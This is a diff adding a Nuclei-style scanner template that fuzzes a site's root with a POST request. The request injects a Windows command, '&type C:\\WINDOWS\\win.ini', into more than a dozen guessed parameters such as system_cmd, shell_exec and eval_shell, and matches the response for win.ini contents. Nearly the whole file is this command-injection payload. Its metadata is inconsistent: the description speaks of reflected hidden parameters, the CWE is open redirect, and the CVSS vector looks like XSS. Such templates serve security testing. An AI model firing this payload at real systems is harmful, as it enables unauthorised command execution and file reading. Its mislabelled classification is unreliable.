@@ -1,0 +1,41 @@
+id: 9rcepost
+
+info:
+  name: 9rcepost
+  author: erickfernandox
+  severity: medium
+  description: |
+    Verifica parametros ocultos que refletem dentro do HTML da pagina
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 6.1
+    cwe-id: CWE-601
+  metadata:
+    max-request: 2
+  tags: fuzzer, generic
+
+
+
+http:
+  - raw:
+    - |+
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Referer: "{{BaseURL}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
+        
+
+        system_cmd=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&system_command=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&system_shell=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&shell_exec=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&assert=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&assertion=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&assert_code=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&assert_eval=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&assert_php=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&assert_template=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&eval_shell=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&exec_shell=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&shell_eval=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini"
+
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - '[mci extensions]'
+          - 'ADD-CMD100GAURAVGAURAV'
